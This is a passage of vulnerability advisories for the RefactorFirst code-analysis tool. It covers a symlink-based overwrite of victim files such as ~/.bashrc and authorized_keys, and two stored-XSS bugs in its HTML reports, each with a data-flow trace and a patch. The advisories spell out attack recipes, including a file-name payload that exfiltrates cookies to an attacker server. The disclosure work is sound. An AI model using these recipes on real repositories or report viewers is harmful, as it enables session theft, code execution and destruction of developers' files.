directory (log: "Deleting …/docs"), so the README's clean-leading GHA flow is immune there — with the escape being a
clean-plugin >= 3.x build (demonstrated: the redirected-location link survives clean 3.2.0 and the write follows it) or
any clean-less flow, and the README's headline usage invokes the goal directly without clean while the CLI path never
runs clean; gitless archive-extracted trees (tar and Info-ZIP unzip both materialize the committed link, but no .git
exists) never reach the write — every HTML/JSON path including the CLI crashes with NullPointerException (Git.open
(null)) before writeReportToDisk, so clone/checkout is the exposed delivery class; Windows checkouts materialize symlink
entries as plain text files (no escape there); and symlink targets resolve like any path — absolute targets must predict
victim paths (fixed on standard CI images: /home/runner, /root), while RELATIVE targets (e.g. ../../.gitconfig for a
repo cloned under ~/projects/<repo>) are username-independent at known clone depth (demonstrated).

## Attack

Attacker: the author (or PR/fork contributor) of a repository that a victim analyzes with RefactorFirst — the tool's
advertised use case; the same persona as the report-injection findings on this tool. Victim: a developer or CI job that
clones the repository (git clone / actions/checkout materializes the committed symlink on Linux/macOS) and runs any
default report command from the repo root — the CLI with default flags, or mvn org.hjug.refactorfirst.plugin:
refactor-first-maven-plugin:htmlReport / simpleHtmlReport / jsonreport. The report write then follows the pre-placed
symlink: the victim's ~/.bashrc, ~/.profile, ~/.gitconfig, ~/.ssh/authorized_keys or any other victim-writable file is
truncated and replaced by the report (its original content destroyed — broken shells, builds, and tooling), or a new
file is created at the chosen victim-writable path. Because the report body carries attacker-chosen newline-separated
lines (via the unescaped file-name/identifier embedding confirmed in the A1/A2 findings), the composed effect is code
execution with the victim's privileges on the next shell/login (payload line in .bashrc/.profile) or persistent access
(embedded key line in authorized_keys — the truncate+rewrite goes through the same inode and preserves its permissions).
The tool reports no error in any variant (all IOExceptions are caught and logged), so the overwrite happens silently
during a normal, successful report run. Real-scenario confirmation (EXP-R6-E3, 89/89 checks): the committed link
survives every git-based delivery flow tested — full and shallow clone, actions/checkout-style fetch, pull (link added
in a later commit), branch switch, reset --hard re-arming a deleted link, and worktree — and the default documented
commands then clobber the victim file; the demonstrated high-impact victim classes are developer workstations and
persistent self-hosted runners (private-key destruction, operator SSH lockout, cross-job git/maven outages, destroyed
deployment credentials), while GitHub-hosted ephemeral runners reduce to within-job tool breakage (GHA step shells never
source rc files) that self-heals at VM teardown, and Windows checkouts and gitless archive downloads are outside the
primitive's reach.

### Payload

The payload is repository state, not a value: a malicious repo contains (a) minimally analyzable Java/Kotlin sources
(any ordinary class; no disharmonies or git history are even required — though a .git directory must exist, since
git-less archive extractions crash before the write, dynamically confirmed), and (b) one committed symlink at the exact
fixed report output name — e.g. target/site/refactor-first-report.html → /home/runner/.bashrc (overwrite variant, for a
Maven-goal victim on a GitHub-hosted Linux runner), refactor-first-report.html → /root/.bashrc at the repo root (CLI
victim in a root docker CI image), or the same fixed name pointing at a non-existent path inside an existing victim
directory (creation variant). Relative targets (e.g. ../../.gitconfig for a repo cloned at ~/projects/<repo>) remove the
username-prediction requirement at known clone depth. For the content-shaped variant, the repo additionally contains a
source file whose name embeds newline-separated payload lines and which trips a detector (e.g. a Data Class with six
public fields), causing those lines to be rendered raw into the report body that is then written through the link. The
same symlink trick can also be placed at refactor-first-data.json for the jsonreport goal.

## Data flow

### Step 1 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:71-75`

Source (CLI entry): -o/--output defaults to "." — the report output directory is the current working directory, i.e. the
analyzed repository root in the documented usage; the value is passed verbatim to the report executors (:108, :122, :
126, :130).

### Step 2 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java:70-78`

Source (Maven entry): the output directory passed to the report is the analyzed project's
own <reporting><outputDirectory> (default <basedir>/target/site), with the basedir prefix stripped so it resolves
against the JVM working directory (the repo root when mvn runs there). Same pattern in the SimpleHtml/Json/Csv mojos.

### Step 3 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:84,113`

Fixed filename: filename = getOutputName () + ".html" with getOutputName () (:950-953) returning the constant
"refactor-first-report" (HtmlReport extends SimpleHtmlReport without overriding it); execute () unconditionally ends in
writeReportToDisk (outputDirectory, filename, reportHtml) — including on the no-git/no-disharmony branches.
JsonReportExecutor.java:22,55 analogously writes the constant refactor-first-data.json.

### Step 4 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:15-19`

Sink step 1: new File (dir).exists () follows symlinks — a committed directory symlink at the output location passes the
check and mkdirs () is skipped, so the write continues into the linked directory; mkdirs () failures on link paths
return false silently (return value ignored).

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:21-29`

Sink step 2: pathname = reportOutputDirectory + File.separator + filename (raw concatenation, no
canonicalization/containment); createNewFile () = open (O_CREAT|O_EXCL) returns false with no exception on a symlinked
path (EEXIST is guaranteed by POSIX even for dangling links) — no guard, no alert.

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:31-35`

Sink step 3 (the write): Files.newBufferedWriter (path, Charset.defaultCharset ()) with no options =
CREATE|TRUNCATE_EXISTING|WRITE = open (O_WRONLY|O_CREAT|O_TRUNC), which follows the final symlink — existing target:
truncated and overwritten with the full report; dangling target with existing parent: target file created with the
report; any IOException (e.g. EISDIR/EACCES at the linked target) is caught and only logged, after which the tool logs
success.

### Step 7 — `attacker-side delivery (standard git semantics; no code in the tool prevents it)`

Attacker commits a symlink (git tree mode 120000; git add -f defeats a gitignored target/) at the exactly predictable
fixed write name inside the analyzed repo; git clone / git checkout / actions/checkout materialize it on Linux/macOS;
nothing in the tool's pipeline (GitLogReader is read-only; ReportWriter is the sole write sink) removes working-tree
links before the write.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java
b/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java @@ -14,17 +14,30 @@ public final class
ReportWriter { public static void writeReportToDisk (final String reportOutputDirectory, final String filename, final
String string) { final File reportOutputDir = new File (reportOutputDirectory);

+        // CWE-59: never let a pre-existing symbolic link relocate the report write.
+        // Files.isSymbolicLink() examines the link itself (lstat semantics), so it also
+        // covers dangling links (the creation-through-link variant).
+        if (Files.isSymbolicLink(reportOutputDir.toPath())) {
+            log.error("Refusing to write report: output directory is a symbolic link: {}", reportOutputDirectory);
+            return;
+        }
         if (!reportOutputDir.exists()) {
             reportOutputDir.mkdirs();
         }

         final String pathname = reportOutputDirectory + File.separator + filename;

         final File reportFile = new File(pathname);
+        if (Files.isSymbolicLink(reportFile.toPath())) {
+            log.error("Refusing to write report: output path is a symbolic link: {}", pathname);
+            return;
+        }

         try {
             reportFile.createNewFile();
             } catch (IOException e) {

## References

- https://cwe.mitre.org/data/definitions/59.html
- https://github.com/eclipse-jgit/jgit/security/advisories/GHSA-3p86-9955-h393 — JGit CVE-2023-4759, published analogue
  (crafted-repository symlinks causing writes outside the working tree, graded high)
- https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#newBufferedWriter-java.nio.file.Path-java.nio.charset.Charset-java.nio.file.OpenOption...- —
  default CREATE/TRUNCATE_EXISTING/WRITE options; symlinks are followed in the absence of NOFOLLOW_LINKS
- https://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html — O_CREAT|O_EXCL fails with EEXIST when path
  names a symbolic link (even a dangling one)
- https://git-scm.com/book/en/v2/Git-Internals-Git-Objects — symlinks are stored as tree entries (mode 120000) and
  materialized by clone/checkout

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] HTML report bubble-chart generator (GraphDataGenerator) embeds analyzed-repo file names unescaped into JavaScript string literals, causing stored XSS when the report is viewed

- key: `BUG-R2-S2-A2-H1`
- disclosure: owner_only
- cwe: CWE-79
- file: `../graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java`

# HTML report bubble-chart generator (GraphDataGenerator) embeds analyzed-repo file names unescaped into JavaScript string literals, causing stored XSS when the report is viewed

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A2-H1
- **CWE:** CWE-79
- **CVSS:** 6.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** 0.6.2 – 0.10.0-SNAPSHOT (dynamically verified, R6/E7: the bubble-chart sink exists in every
  released plugin version from 0.6.2 — god-class channel — and from 0.9.0 additionally via the Data-Class channel;
  versions 0.4.0–0.6.0 generate full HTML reports without any google.visualization chart data tables, so this sink is
  absent there; the god-class channel works on the HTML path at 0.9.0/snapshot — the GodClassRanker NPE that blocks the
  CSV report there does not affect htmlReport; CLI delivery requires ≤0.6.2 with explicit -t HTML because 0.7.0+ CLI
  builds crash at startup with a pre-existing picocli bug)

## Exploitability rationale

R:L — the attacker must control files of the repository the victim analyzes (public repo / PR) and the victim must run
the tool and someone must open the report online; no network position or credentials needed, but victim interaction is
inherent to delivery. E:D — the vulnerable sink is on the default report path with zero victim configuration: CLI
default report type is HTML (-t HTML), the Maven htmlReport goal, and the mvn site refactor-first-report goal all render
the bubble chart (all three verified dynamically, R6/E7), and the chart sink exists in every released plugin version
from 0.6.2 through the audited snapshot (god-class channel verified on 0.6.2/0.7.0/0.7.1/0.8.0/0.9.0/snapshot; the
easier Data-Class channel from 0.9.0; versions 0.4.0-0.6.0 emit no chart data tables at all - sink absent);
-DminifyHtml=true does not neutralize it. C:D — deterministic string propagation with zero escaping on the whole path;
every online view of the persistent report artifact fires the payload (offline views are dormant - verified). I:S —
arbitrary JavaScript executes in the origin serving the report and acts with the report viewer's privileges there:
dynamically demonstrated (real Chromium, R6/E7) on a Jenkins-style same-origin artifact-hosting simulation —
session-cookie exfiltration plus credentialed same-origin API reads with response exfiltration (HttpOnly-resistant) plus
content spoofing of the trusted report; on a local file:// view execution is confirmed but origin-bounded to spoofing
and outbound requests (no cookie/local-file/intranet reach - verified), and offline views execute nothing. Impact beyond
the hosting origin's browser context was not demonstrated.

## Code anchors

| File                                                                                                      | Line | Function                                           |
|-----------------------------------------------------------------------------------------------------------|-----:|----------------------------------------------------|
| `../graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java`                                 |   45 | `generateBubbleChartData()`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                      |  459 | `renderDisharmonyChart()`                          |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                |  992 | `renderDisharmonyInfo()`                           |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java`                                |   87 | `RankedDisharmony(DisharmonyInstance, ScmLogInfo)` |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`                           |  145 | `getClassDisharmonies()`                           |
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                                    |  141 | `fileLog()`                                        |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java` |   67 | `buildGraph()`                                     |

## Background

RefactorFirst (org.hjug.refactorfirst) is a developer/CI static-analysis tool that ranks code smells ("disharmonies":
God Classes, Data Classes, Brain Methods, Feature Envy, …) in a Java/Kotlin repository by combining source metrics
(OpenRewrite parsing) with git change history (JGit), and emits an interactive HTML report (plus CSV/JSON/simple-HTML
variants). The interactive report is the default output: the CLI defaults to `-t HTML`, the Maven plugin exposes an
`htmlReport` goal, and `mvn site` renders `refactor-first-report.html`. The report is a live web page: it loads Google
Charts, sigma.js, graphology, 3d-force-graph and vizdom from public CDNs, and each detected disharmony type is
visualized as a Google Bubble Chart whose data rows are generated by `GraphDataGenerator.generateBubbleChartData()`. The
tool's documented workflow points it at third-party/cloned repositories (the primary untrusted-input channel) and
instructs users to open the generated report in a browser — and the project itself publishes a sample report over HTTPS
on rawcdn.githack.com, so reports are routinely exposed to web origins.

## Description

generateBubbleChartData () builds the chart data table by raw string concatenation and writes each ranked disharmony's
file name directly inside a single-quoted JavaScript string literal:
`chartData.append("'").append(rankedDisharmony.getFileName()).append("',")` (GraphDataGenerator.java:44-46). The result
is wrapped by getDisharmonyScriptStart ()/getDisharmonyScriptEnd () and emitted verbatim as
`<div ...><script>…</script></div>` (HtmlReport.java:459-476). The file name originates from the analyzed repository's
file system: source discovery only filters on the `.java`/`.kt` extension (`Files.walk(...).filter(endsWith(".java"))`,
JavaSourceFileGraphBuilder.java:67), the path is carried raw through the metrics pipeline (MetricsVisitorLogic.java:76 —
`ClassMetrics.sourceFilePath` = raw CU source path; the `canonicaliseURIStringForRepoLookup` prefix-strip in
CostBenefitCalculator.java:145/462-468 is a no-op on the plain absolute path), the git lookup never drops unmatched
paths (GitLogReader.fileLog:141-143 returns a non-null ScmLogInfo with commitCount=0), and
`RankedDisharmony.fileName = Path.of(path).getFileName().toString()` (RankedDisharmony.java:74/87) preserves every legal
path byte — including the single quote, which is a legal file-name character on Linux, macOS and Windows. No HTML/JS
escaping, no encoding, no Content-Security-Policy, and no name validation exist anywhere on this path; the opt-in
minifyHtml post-processing (default false, applied after concatenation, whitespace-level JS minification only) cannot
neutralize it. A file name containing `'` therefore closes the JavaScript string literal inside the report's `<script>`
block, and the remaining attacker text is parsed as array elements of the `google.visualization.arrayToDataTable([...])`
argument — a function call placed there executes when the chart's draw function runs. The draw function is invoked via
`google.charts.setOnLoadCallback(...)` once the Google Charts loader (loaded from the CDN by the report head,
HtmlReport.java:396) is ready, i.e. in the report's normal online viewing mode. Because `fileName` is a single path
segment, it can never contain `/`; the `</script>` HTML-breakout variant is therefore NOT reachable through this
particular sink (it is reachable through the sibling HTML-context sinks of the same report). A raw newline in the file
name instead produces a syntax error that disables that one chart block (DoS only).

## Attack

Attacker = author of a public repository (or PR/fork contributor); victims = (1) a developer or CI pipeline that runs
RefactorFirst on the repository and (2) anyone who then opens the generated report online — exactly the tool's
documented usage (the repo-attacker → report-viewer personas; the README's own sample analysis is of a third-party
project and its sample report is published on rawcdn.githack.com). Steps: (1) attacker commits the crafted `.java` file
(name ≤255 bytes, Windows-safe, no `/`) to a repository; (2) victim-1 clones it and runs a default analysis — CLI
`refactorfirst report` (default `-t HTML`), Maven `htmlReport` goal, or `mvn site` with the reporting plugin (all three
entry points dynamically verified, R6/E7; released plugin versions 0.6.2–0.9.0 and the snapshot are affected via the
god-class channel, 0.9.0+ also via data classes); the report `target/site/refactor-first-report.html` is generated with
the payload embedded in the bubble-chart script block; (3) victim-2 — the analyst, or any recipient of the report
artifact (CI artifact link, internal report server, published site page) — opens the report in a browser while the
Google Charts loader is reachable (the only network precondition, verified); the loader callback fires the chart's draw
function and the injected JavaScript executes in that origin. Real-world impact, dynamically measured (real Chromium,
R6/E7): on a session-bearing hosting origin (Jenkins-style inline artifact serving — simulated locally) the payload
exfiltrated the viewer's session cookie and performed a credentialed same-origin API read, exfiltrating the full
session-profile response to the attacker server (works even with HttpOnly session cookies), disclosed the origin, and
spoofed the report content for every viewer — stored XSS acting as the report viewer, persistent across every subsequent
online view; on a local file:// view the script still executes but is origin-bounded (no cookies, no local-file read —
both verified blocked; outbound requests and content spoofing do work); with the charts CDN unreachable the payload
stays dormant.

### Payload

A Java source file added to the analyzed repository under `src/main/java/` whose NAME carries the payload — any name
containing a `'` plus a JavaScript expression, ending in `.java`, whose class body trips one detector. Because the name
is a single path component it can NEVER contain `/` (so the payload must build URLs at runtime, e.g. via
`unescape('%68%74%74%70%3a%2f%2f…')`), and to survive Windows checkouts it must also avoid `\ : * ? " < > |` — verified
Windows-safe, cross-platform exfiltration payload shapes of 33–247 bytes exist, e.g.
`x',(function(){new Image().src=unescape('%68…%2f%62%3f%63%3d')+escape(document.cookie)+'%26%6f%3d'+escape(location.origin)})(),'x.java`
(cookie+origin exfil) and a same-origin `fetch(unescape('%2f%61%70%69…')).then(…)` shape that exfiltrates the response
of any endpoint the report viewer can access. Detector recipes: Data Class = 6 public fields, 0 methods (trivial; works
0.9.0+), or God Class (WMC>=47, ATFD>5, TCC<1/3; works 0.6.2+). The report then contains a row like
`['x',<payload>(),'x.java',1,2,2,0]` inside the chart's `<script>` block: the single quote closes the literal and the
payload becomes a live array element, evaluated when the Google Charts load callback invokes the chart's draw function
(R6/E7 verified in real Chromium: dialog + cookie/origin/document.domain exfiltration + credentialed same-origin API
response exfiltration + DOM spoofing, all on the report-hosting origin).

## Data flow

### Step 1 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java:67`

Source: Files.walk over the analyzed repository filtered only by `.endsWith(".java")` — attacker (repo author) fully
controls the file name, including `'`; no character constraints.

### Step 2 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsCollectingVisitor.java:45-47 + MetricsVisitorLogic.java:76`

OpenRewrite parses the file regardless of its name (no name/class match required); `ClassMetrics.sourceFilePath` = raw
absolute CU source path string, every byte preserved.

### Step 3 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:137-158`

When the class trips a detector (e.g. God Class, DisharmonyDetector.java:352-355), `getClassDisharmonies` sets
`DisharmonyInstance.fileRepoPath` = `canonicaliseURIStringForRepoLookup(sourceFilePath.replace("\\","/"))` — the input
is a plain path, so the `file://<repo>/` prefix strip (lines 462-468) is a no-op and the path with `'` survives
verbatim.

### Step 4 —

`cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:190-274 + change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:122-146`

`gitLogReader.fileLog(path)` always returns a non-null ScmLogInfo carrying the path verbatim, even with zero matching
commits (lines 141-143); ranking tolerates the 0-commit/NaN row, so the crafted row survives all filters.

### Step 5 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java:74-87`

`fileName = Path.of(path).getFileName().toString()` — final path segment, un-encoded; `'` is a legal path byte on
Linux/macOS/Windows, so fileName retains the payload.

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:992 + HtmlReport.java:459-476`

`renderDisharmonyInfo` → `renderDisharmonyChart` (HtmlReport override) assembles the chart script and emits it as
`<div …><script>` + script + `</script>` — raw concatenation, no escaping.

### Step 7 — `graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java:44-46`

Sink: `chartData.append("'").append(rankedDisharmony.getFileName()).append("',")` — the attacker-controlled file name is
placed unescaped inside a single-quoted JavaScript string literal within the `<script>` block; a `'` in the name closes
the literal and injects live JavaScript (array elements of `google.visualization.arrayToDataTable([...])`).

### Step 8 —

`graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java:8-14 + report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:396`

Execution trigger: the same script registers `google.charts.setOnLoadCallback(draw_<slug>)` and the report head loads
`https://www.gstatic.com/charts/loader.js`; when the report is viewed online (its designed mode), the callback fires and
the injected expression executes in the report's origin. Report written verbatim to disk by ReportWriter.java:24-40.

## Fix / patch notes

diff --git a/graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java
b/graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java ---
a/graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java +++
b/graph-data-generator/src/main/java/org/hjug/gdg/GraphDataGenerator.java @@ -42,7 +42,8 @@ public class
GraphDataGenerator { RankedDisharmony rankedDisharmony = rankedDisharmonies.get (i); chartData.append ("[");
chartData.append ("'");

-            chartData.append(rankedDisharmony.getFileName());

+            // Escape for the single-quoted JavaScript string literal context
+            chartData.append(escapeJavaScriptString(rankedDisharmony.getFileName()));
             chartData.append("',");
             chartData.append(rankedDisharmony.getEffortRank());
             chartData.append(",");

@@ -58,4 +59,13 @@ public class GraphDataGenerator { } return chartData.toString (); }

+
+ static String escapeJavaScriptString (String value) {
+        if (value == null) {
+            return "";
+        }
+        return value.replace("\\", "\\\\").replace("'", "\\'")
+                .replace("\n", "\\n").replace("\r", "\\r");
+ } }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/94.html
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] HTML report package-map generator (renderPackageGraph*) embeds analyzed-repo Kotlin package names into a JavaScript template literal with only dot-replacement, causing stored XSS via ${…} interpolation when the report is viewed

- key: `BUG-R2-S2-A2-H4`
- disclosure: owner_only
- cwe: CWE-79
- file: `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`

# HTML report package-map generator (renderPackageGraph*) embeds analyzed-repo Kotlin package names into a JavaScript template literal with only dot-replacement, causing stored XSS via ${…} interpolation when the report is viewed

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A2-H4
- **CWE:** CWE-79
- **CVSS:** 6.9 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** present only in the unreleased development head: 0.10.0-SNAPSHOT (commit 65d3bef, rewrite-bom
  8.90.4 / rewrite-kotlin 8.90.4 / kotlin-compiler-embeddable 2.4.10) — the unconditional Kotlin analysis
  (KotlinSourceFileGraphBuilder, the source channel of this finding) first exists there, and the package-map DOT writer
  with dot-only replacement ships in the same snapshot. Verified NOT affected: released 0.9.0 (latest release, the
  version pinned by every README command — its htmlReport goal run on the payload fixture produces a payload-free report
  with no Kotlin-derived packages, while the Java packages render a normal Package Map), and 0.8.0 / 0.7.1
  (codebase-graph-builder contains zero Kotlin classes; no Kotlin parsing exists). The unescaped package branches
  themselves are old code, but no released version has a markup/JS-bearing package-name source (Java identifiers cannot
  carry ${...}), so no released version is reachable. The earlier phrase "earlier releases likely affected, range not
  verified" is refuted by these measurements. The CLI code path exists but no released CLI jar (0.7.0-0.9.0) nor the
  audited snapshot can start (pre-existing picocli duplicate --output bug); the sink's live entry points are the
  htmlReport goal, the mvn site integration, and (on the patched launcher only) the CLI.

## Exploitability rationale

R:L — the attacker must control source files of the repository the victim analyzes (public repo / PR / fork), which is
the tool's documented primary workflow; the source-text channel is the cheapest of the audit's report-injection findings
(clone, archive and fork-PR checkout deliveries all verified end-to-end from the victim's side; the victim's own build
is unaffected), but no network position or credentials are involved. E:D — the sink renders on the default path of the
working entry points that generate the full report: the htmlReport goal (the README headline flow), the mvn site
integration (verified: the site artifact carries and executes the payload) and the CLI's HTML default (code path only —
every released CLI jar and the audited snapshot fail to start on a pre-existing picocli bug); Kotlin analysis runs
unconditionally on every *.kt file; with the decisive caveat that the Kotlin analysis is UNRELEASED (no version ≤ 0.9.0
parses Kotlin sources — verified dynamically and by jar inspection), so exposure starts with the next release unless
fixed first. simpleHtmlReport carries no graph blocks and the README's GITHUB_STEP_SUMMARY flow is sanitized
(measured) — the CI-summary surface is not a carrier. C:D — the injection is a JS template-literal substitution that
executes during initial script evaluation at page load, with no click, no CDN dependency for the trigger, no CSP, and no
escaping on the package branches; the empirically forbidden bytes in the package name are only ( ) : / ? backtick
newline, which do not prevent arbitrary JavaScript (bracket notation + \uXXXX escapes inside a re-parsed handler
string + assignment side effects) — verified end-to-end with a session-theft chain. I:S — on an authenticated origin
that publishes the report (the standard Jenkins-HTML-Publisher / artifact-viewer / dashboard pattern — a victim-side
condition the attacker does not control) the impact is session-class: proven exfiltration of the origin's private data,
the viewer's session id and cookies, with the server-side authenticated ride-along logged and HttpOnly not mitigating;
on the default local file:// view the impact is bounded (attacker-controlled rendering in a trusted context,
phishing/redirect plus beacon egress with an empty cookie; local-file reads and same-origin fetch blocked by the
browser). The realistically achievable top impact is session hijack on hosting origins / info-leak-plus-phishing
elsewhere, not code execution. A secondary same-root-cause effect (double-quote in Kotlin class/package names breaking
out of DOT quoted strings and corrupting the vizdom/graphlib-dot rendering) is bounded to rendering corruption/DoS and
remains documented in the same finding (observed live: the payload-corrupted package map throws "failed to parse the DOT
input" while the rest of the report keeps working).

## Code anchors

| File                                                                                                        | Line | Function                                                   |
|-------------------------------------------------------------------------------------------------------------|-----:|------------------------------------------------------------|
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        | 1049 | `renderPackageVertices()`                                  |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        | 1019 | `renderPackageGraphEdge()`                                 |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  512 | `generateGraphButtons()`                                   |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  962 | `renderPackageGraphVisuals()`                              |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  995 | `buildPackageGraphDot()`                                   |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  605 | `renderClassVertices() — class label branch`               |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  390 | `package-map call site (hasAnyDisharmony gate at 355-371)` |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  | 1174 | `extractVertexes()`                                        |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java`           |   64 | `visitCompilationUnit()`                                   |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/GraphDependencyCollector.java`                  |   79 | `addPackageDependency()`                                   |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java`   |  120 | `finalizeDto() / removePackagesNotInCodebase()`            |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/CompositeGraphBuilder.java`                     |   74 | `getCodebaseGraphDTO()`                                    |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java` |   75 | `buildGraph()`                                             |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                               |   83 | `reportType default (HTML)`                                |
| `dependency: org/openrewrite/kotlin/internal/KotlinTreeParserVisitor.java`                                  | 3833 | `createIdentifier() — backtick stripping`                  |
| `dependency: org/openrewrite/java/tree/J.java`                                                              | 5005 | `J.Package.getPackageName() — JavaPrinter-based raw print` |
| `dependency: org/openrewrite/kotlin/KotlinTypeSignatureBuilder.kt`                                          |  712 | `convertClassIdToFqn() / convertKotlinFqToJavaFq()`        |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin, picocli CLI) that parses a Java/Kotlin codebase
with OpenRewrite, builds class- and package-dependency graphs, detects cycles and code disharmonies, and emits an
interactive HTML report. The interactive report is the default output (CLI -t HTML default; Maven htmlReport goal; mvn
site report) and is a live web page that loads Google Charts, sigma.js, graphology, graphlib-dot, 3d-force-graph and
vizdom from public CDNs — online viewing is its designed mode, and reports are routinely shared via CI artifacts,
appended to $GITHUB_STEP_SUMMARY, or hosted (the project itself publishes sample reports on a web origin). Kotlin
analysis runs unconditionally on every *.kt/*.kts file. The package map section renders the package-dependency graph:
package names collected from the analyzed sources are written into a Graphviz DOT document, and that DOT document is
embedded into the report inside a JavaScript template literal (const packageGraph_dot = `...`;) that the page's 2D/3D
popup renderers and the vizdom WASM renderer consume. Kotlin identifiers written between backticks may legally contain
any characters except backtick and newline — including quotes, dollar signs and braces — so every package name derived
from a Kotlin source file is attacker-controlled free-form text whenever the analyzed repository is not fully trusted
(the tool's documented workflow points it at cloned third-party repositories).

## Description

The package-map DOT writers apply a single transformation to package names: '.' is replaced by '_'.
renderPackageGraphEdge () emits edge endpoint ids as vertex.replace (".", "_") (HtmlReport.java:1031-1032) and
renderPackageVertices () emits the node id as packageName.replace (".", "_") (:1054) and the label as
label="<raw packageName>" with no escaping at all (:1056-1058). Unlike every class-node-id branch (renderSafeNodeId ()
maps '$' to '_' at :636-644/:672-719) and the class-label branch (which escapes '$' at :605-607), the package branches
contain no
'$' handling and no quote escaping. The DOT is wrapped in backticks by buildPackageGraphDot () (:995-1017) and emitted by generateGraphButtons () (:512-521) as a classic inline script block "const packageGraph_dot =
`...`;", so any ${...} sequence in a package name is a JavaScript template-literal substitution that evaluates during
initial script execution at page load — zero interaction, not gated by dotGraphThreshold (4000) which only gates the
vizdom image div. Upstream, the raw package text survives the whole parser chain: the Kotlin lexer tokenizes a
backtick-quoted segment as a single IDENTIFIER whose text is the raw content (Kotlin.flex ESCAPED_IDENTIFIER rule),
rewrite-kotlin's createIdentifier () strips exactly the outer backticks and stores the inner text verbatim as the
identifier's simple name (KotlinTreeParserVisitor.java:3833-3851), and J.Package.getPackageName () prints that
expression through the generic JavaPrinter — which ignores rewrite-kotlin's Quoted marker and therefore returns the raw
content without backticks (J.java:5005-5011; J.CompilationUnit.printer () returns JavaPrinter at J.java:1672-1674;
JavaPrinter.visitIdentifier at JavaPrinter.java:711-718). The FIR-attributed class FQN is built from the package FqName
with join-only, unvalidated name machinery and passes through convertClassIdToFqn ()/convertKotlinFqToJavaFq (), which
apply only
'.'→'$', '/'→'.' and '?'-stripping (KotlinTypeSignatureBuilder.kt:712-731) — so a class in a backticked package gets an FQN like p$
{payload}x.Evil with the payload intact. A cross-package type reference then creates the package edge
(GraphDependencyCollector.addPackageDependency/getPackageFromFqn, :79-114), and the evil package survives finalizeDto's
removePackagesNotInCodebase () prune because the registered name (print-based) and the FQN-derived name agree for
payloads without '/'. Four accidental character constraints remain: extractVertexes () strips '(' and ')' and splits on
